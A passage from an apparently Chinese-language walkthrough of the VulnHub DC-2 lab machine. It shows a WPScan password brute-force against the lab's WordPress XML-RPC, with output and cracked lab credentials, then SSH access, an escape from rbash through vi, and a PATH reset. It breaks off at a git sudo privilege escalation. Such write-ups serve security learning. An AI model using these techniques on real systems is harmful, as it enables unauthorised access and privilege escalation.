class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]<br>└─$ sudo wpscan --url http://dc-2 -U <span class="hljs-string">&#x27;admin&#x27;</span> -P dc-2.txt <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="hljs-string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="hljs-string"></span><br><span class="hljs-string">         WordPress Security Scanner by the WPScan Team</span><br><span class="hljs-string">                         Version 3.8.22</span><br><span class="hljs-string">       Sponsored by Automattic - https://automattic.com/</span><br><span class="hljs-string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="hljs-string">_______________________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] URL: http://dc-2/ [192.168.56.110]</span><br><span class="hljs-string">[+] Started: Sun May 28 14:33:45 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">Interesting Finding(s):</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Headers</span><br><span class="hljs-string"> | Interesting Entry: Server: Apache/2.4.10 (Debian)</span><br><span class="hljs-string"> | Found By: Headers (Passive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress readme found: http://dc-2/readme.html</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 60%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="hljs-string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).</span><br><span class="hljs-string"> | Found By: Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="hljs-string"> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress theme in use: twentyseventeen</span><br><span class="hljs-string"> | Location: http://dc-2/wp-content/themes/twentyseventeen/</span><br><span class="hljs-string"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="hljs-string"> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt</span><br><span class="hljs-string"> | [!] The version is out of date, the latest version is 3.2</span><br><span class="hljs-string"> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10</span><br><span class="hljs-string"> | Style Name: Twenty Seventeen</span><br><span class="hljs-string"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="hljs-string"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="hljs-string"> | Author: the WordPress team</span><br><span class="hljs-string"> | Author URI: https://wordpress.org/</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Version: 1.2 (80% confidence)</span><br><span class="hljs-string"> | Found By: Style (Passive Detection)</span><br><span class="hljs-string"> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;</span>Version: 1.2<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No plugins Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Config Backups - Time: 00:00:00 &lt;===================&gt; (137 / 137) 100.00% Time: 00:00:00</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Config Backups Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Performing password attack on Xmlrpc against 1 user/s</span><br><span class="hljs-string">Trying admin / flag Time: 00:00:33 &lt;==========================&gt; (238 / 238) 100.00% Time: 00:00:33</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Valid Passwords Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Sun May 28 14:34:22 2023</span><br><span class="hljs-string">[+] Requests Done: 379</span><br><span class="hljs-string">[+] Cached Requests: 37</span><br><span class="hljs-string">[+] Data Sent: 152.28 KB</span><br><span class="hljs-string">[+] Data Received: 168.256 KB</span><br><span class="hljs-string">[+] Memory used: 238.438 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:00:37</span><br></code></pre></td></tr></table></figure>

<p>然而并没有成功，看来只能退而求其次，看看tom&amp;jerry两兄弟能不能成功爆破出来。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]<br>└─$ sudo wpscan --url http://dc-2 -U <span class="hljs-string">&#x27;jerry,tom&#x27;</span> -P dc-2.txt<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="hljs-string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="hljs-string"></span><br><span class="hljs-string">         WordPress Security Scanner by the WPScan Team</span><br><span class="hljs-string">                         Version 3.8.22</span><br><span class="hljs-string">       Sponsored by Automattic - https://automattic.com/</span><br><span class="hljs-string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="hljs-string">_______________________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] URL: http://dc-2/ [192.168.56.110]</span><br><span class="hljs-string">[+] Started: Sun May 28 14:35:07 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">Interesting Finding(s):</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Headers</span><br><span class="hljs-string"> | Interesting Entry: Server: Apache/2.4.10 (Debian)</span><br><span class="hljs-string"> | Found By: Headers (Passive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress readme found: http://dc-2/readme.html</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 60%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="hljs-string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).</span><br><span class="hljs-string"> | Found By: Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="hljs-string"> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress theme in use: twentyseventeen</span><br><span class="hljs-string"> | Location: http://dc-2/wp-content/themes/twentyseventeen/</span><br><span class="hljs-string"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="hljs-string"> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt</span><br><span class="hljs-string"> | [!] The version is out of date, the latest version is 3.2</span><br><span class="hljs-string"> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10</span><br><span class="hljs-string"> | Style Name: Twenty Seventeen</span><br><span class="hljs-string"> | Style URI: https://wordpress.org/themes/twentyseventeen/</span><br><span class="hljs-string"> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...</span><br><span class="hljs-string"> | Author: the WordPress team</span><br><span class="hljs-string"> | Author URI: https://wordpress.org/</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Version: 1.2 (80% confidence)</span><br><span class="hljs-string"> | Found By: Style (Passive Detection)</span><br><span class="hljs-string"> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#x27;</span>Version: 1.2<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No plugins Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Config Backups - Time: 00:00:00 &lt;===================&gt; (137 / 137) 100.00% Time: 00:00:00</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No Config Backups Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Performing password attack on Xmlrpc against 2 user/s</span><br><span class="hljs-string">[SUCCESS] - jerry / adipiscing                                                                    </span><br><span class="hljs-string">[SUCCESS] - tom / parturient                                                                      </span><br><span class="hljs-string">Trying tom / dis Time: 00:01:01 &lt;=============                 &gt; (410 / 886) 46.27%  ETA: ??:??:??</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] Valid Combinations Found:</span><br><span class="hljs-string"> | Username: jerry, Password: adipiscing</span><br><span class="hljs-string"> | Username: tom, Password: parturient</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Sun May 28 14:36:12 2023</span><br><span class="hljs-string">[+] Requests Done: 550</span><br><span class="hljs-string">[+] Cached Requests: 38</span><br><span class="hljs-string">[+] Data Sent: 237.565 KB</span><br><span class="hljs-string">[+] Data Received: 267.936 KB</span><br><span class="hljs-string">[+] Memory used: 256.16 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:01:05</span><br></code></pre></td></tr></table></figure>

<p><code>jerry:adipiscing;tom:parturient </code>猫和老鼠两兄弟凭证都成功爆破出来了。我们登录进去看看。发现在jerry账号下在pages里可以找到flag2。</p>
<p class='item-img' data-src='/pic/assets/flag2.png'><img src="/pic/assets/flag2.png" alt="flag2"></p>
<p>他说如果利用不了wordpress就走别的路吧。</p>
<p>那我们肯定是不服气的，先看看wp有没有能利用的点吧。</p>
<p>我们最常用的admin账号下的plugin以及themes在当前两个用户下都没有。</p>
<p>那我们尝试一下文件上传呢：</p>
<p class='item-img' data-src='/pic/assets/media-upload-fail.png'><img src="/pic/assets/media-upload-fail.png" alt="media-upload-fail"></p>
<p>发现没权限写。emmmmm，那就暂时没发现可以利用的地方了（也可能是遗漏一些我不知道的get shell方式）。</p>
<p>结合作者的提示和及时止损的原则，我们先试试别的路吧。</p>
<p>80端口暂时走不通，试试<del>22</del>,不对，应该是7744端口了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]<br>└─$ ssh jerry@192.168.56.110 -p 7744<br>The authenticity of host <span class="hljs-string">&#x27;[192.168.56.110]:7744 ([192.168.56.110]:7744)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:JEugxeXYqsY0dfaV/hdSQN31Pp0vLi5iGFvQb8cB1YA.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>[192.168.56.110]:7744<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">jerry@192.168.56.110&#x27;</span>s password: <br>Permission denied, please try again.<br>jerry@192.168.56.110<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">┌──(kali㉿kali)-[~/vulnhub/DC/2/workSpace]</span><br><span class="hljs-string">└─$ ssh tom@192.168.56.110 -p 7744</span><br><span class="hljs-string">tom@192.168.56.110&#x27;</span>s password: <br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>tom@DC-2:~$ <br></code></pre></td></tr></table></figure>

<p>发现虽然jerry登不进去，但是tom可以登录。我们还是轻松获取到了立足点。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>然而不能高兴太早，登进来发现是个rbash也就是是个受限的shell。啥命令也没有，很难绷。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@DC-2:~$ sudo -l<br>-rbash: sudo: <span class="hljs-built_in">command</span> not found<br>tom@DC-2:~$ <span class="hljs-built_in">ls</span><br>flag3.txt  usr<br>tom@DC-2:~$ <span class="hljs-built_in">cat</span> flag3.txt<br>-rbash: <span class="hljs-built_in">cat</span>: <span class="hljs-built_in">command</span> not found<br>tom@DC-2:~$ <span class="hljs-built_in">which</span><br>-rbash: <span class="hljs-built_in">which</span>: <span class="hljs-built_in">command</span> not found<br>tom@DC-2:~$ python<br>-rbash: python: <span class="hljs-built_in">command</span> not found<br>tom@DC-2:~$ <span class="hljs-built_in">pwd</span><br>/home/tom<br>tom@DC-2:~$ <span class="hljs-built_in">whoami</span><br>-rbash: <span class="hljs-built_in">whoami</span>: <span class="hljs-built_in">command</span> not found<br>tom@DC-2:~$ /bin/bash<br>-rbash: /bin/bash: restricted: cannot specify `/<span class="hljs-string">&#x27; in command names</span><br><span class="hljs-string">tom@DC-2:~$ find</span><br><span class="hljs-string">-rbash: find: command not found</span><br></code></pre></td></tr></table></figure>

<p>一套连招下来就一个<code>ls</code>和<code>pwd</code>能用的,flag3在眼前看不了？</p>
<p>既然<code>cat</code>被ban了，那我们试试<code>vi</code>能不能看，发现竟然可以。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Poor old Tom is always running after Jerry. Perhaps he should su <span class="hljs-keyword">for</span> all the stress he causes.<br>~                                                                     <br>~                                                                     <br>~                                                                     <br>~                                                                     <br>~                                                                     <br>~                                                                                                                                                   <br><span class="hljs-string">&quot;flag3.txt&quot;</span> 1 line, 95 characters<br></code></pre></td></tr></table></figure>

<p>他说可怜的tom是时候使用<code>su</code>了。</p>
<p>然而可怜的tom的<code>su</code>命令也被扣掉了。这时候我们就去专业对口的gtfobins上找找有什么能逃出受限shell的方法。我们惊喜的发现<code>vi</code>就可以。这下能力越大责任越大了。</p>
<p class='item-img' data-src='/pic/assets/vi-escape.png'><img src="/pic/assets/vi-escape.png" alt="vi-escape"></p>
<p>方法a显然不行，因为rbash此时限制了‘&#x2F;’的使用，在上面我们试命令的时候就看得出来了。</p>
<p>那我们试试方法b，发现成功逃脱。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@DC-2:~$ vi<br><br>$ <span class="hljs-built_in">whoami</span><br>/bin/sh: 1: <span class="hljs-built_in">whoami</span>: not found<br>$ /bin/bash<br>tom@DC-2:~$ <span class="hljs-built_in">whoami</span><br>bash: <span class="hljs-built_in">whoami</span>: <span class="hljs-built_in">command</span> not found<br>tom@DC-2:~$ <span class="hljs-built_in">ls</span> -la<br>total 40<br>drwxr-x--- 3 tom  tom  4096 May 28 03:11 .<br>drwxr-xr-x 4 root root 4096 Mar 21  2019 ..<br>-rwxr-x--- 1 tom  tom   336 May 28 03:11 .bash_history<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_login<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_logout<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bash_profile<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .bashrc<br>-rwxr-x--- 1 tom  tom    95 Mar 21  2019 flag3.txt<br>-rwxr-x--- 1 tom  tom    30 Mar 21  2019 .profile<br>drwxr-x--- 3 tom  tom  4096 Mar 21  2019 usr<br>tom@DC-2:~$ <span class="hljs-built_in">cat</span> flag3.txt <br>bash: <span class="hljs-built_in">cat</span>: <span class="hljs-built_in">command</span> not found<br>tom@DC-2:~$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span><br>/bin/rbash<br>tom@DC-2:~$ su jerry<br>bash: su: <span class="hljs-built_in">command</span> not found<br>tom@DC-2:~$ <span class="hljs-built_in">cd</span> usr<br>tom@DC-2:~/usr$ <span class="hljs-built_in">ls</span> -la<br>total 12<br>drwxr-x--- 3 tom tom 4096 Mar 21  2019 .<br>drwxr-x--- 3 tom tom 4096 May 28 03:11 ..<br>drwxr-x--- 2 tom tom 4096 Mar 21  2019 bin<br>tom@DC-2:~/usr$ <span class="hljs-built_in">cd</span> bin<br>tom@DC-2:~/usr/bin$ <span class="hljs-built_in">ls</span> -la<br>total 8<br>drwxr-x--- 2 tom tom 4096 Mar 21  2019 .<br>drwxr-x--- 3 tom tom 4096 Mar 21  2019 ..<br>lrwxrwxrwx 1 tom tom   13 Mar 21  2019 less -&gt; /usr/bin/less<br>lrwxrwxrwx 1 tom tom    7 Mar 21  2019 <span class="hljs-built_in">ls</span> -&gt; /bin/ls<br>lrwxrwxrwx 1 tom tom   12 Mar 21  2019 scp -&gt; /usr/bin/scp<br>lrwxrwxrwx 1 tom tom   11 Mar 21  2019 vi -&gt; /usr/bin/vi<br></code></pre></td></tr></table></figure>

<p>发现还没完，虽然逃出来了，<code>cd</code>不受限制了，但是还是好多命令找不到，我们<code>cd</code>到<code>/home/tom/usr/bin</code>目录下发现给我们只开了四个命令，难怪好多命令找不到。</p>
<p>那多半就是当前用户的<code>$PATH</code>设置的问题了，我们看看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@DC-2:~/usr/bin$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/home/tom/usr/bin<br>tom@DC-2:~/usr/bin$ <span class="hljs-built_in">export</span> PATH=/usr/bin:<span class="hljs-variable">$PATH</span><br>tom@DC-2:~/usr/bin$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/usr/bin:/home/tom/usr/bin<br>tom@DC-2:~/usr/bin$ <span class="hljs-built_in">cat</span><br>bash: <span class="hljs-built_in">cat</span>: <span class="hljs-built_in">command</span> not found<br></code></pre></td></tr></table></figure>

<p>发现果然是<code>$PATH</code>的问题，我们加个<code>/usr/bin</code>，发现还是不行，算了直接从攻击机的环境变量拷贝一份过来算了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@DC-2:/home/jerry$ <span class="hljs-built_in">export</span> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin:<span class="hljs-variable">$PATH</span><br>tom@DC-2:/home/jerry$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin:/usr/bin:/home/tom/usr/bin<br>tom@DC-2:/home/jerry$ <span class="hljs-built_in">which</span> <span class="hljs-built_in">cat</span><br>/bin/cat<br>tom@DC-2:/home/jerry$ <span class="hljs-built_in">cat</span> flag4.txt <br>Good to see that you<span class="hljs-string">&#x27;ve made it this far - but you&#x27;</span>re not home yet. <br><br>You still need to get the final flag (the only flag that really counts!!!).  <br><br>No hints here - you<span class="hljs-string">&#x27;re on your own now.  :-)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Go on - git outta here!!!!</span><br></code></pre></td></tr></table></figure>

<p>发现命令都可以用了，并且我们也在jerry的目录下找到了flag4。</p>
<p>虽然傲娇作者表面上说<code>No hints here - you&#39;re on your own now.  :-)</code>,实际上还是给了提示:’Go on - git outta here!!!!’告诉我们用<code>git</code>。</p>
<p>其实这块没细看也没关系，反正<code>sudo -l</code>的时候肯定能发现。</p>
<p>至于git怎么利用还是在<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/git/#sudo">gtfobins</a>上就能找到：</p>
<p class='item-img' data-src='/pic/assets/git-privesca.png'><img src="/pic/assets/git-privesca.png" alt="git-privesca"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 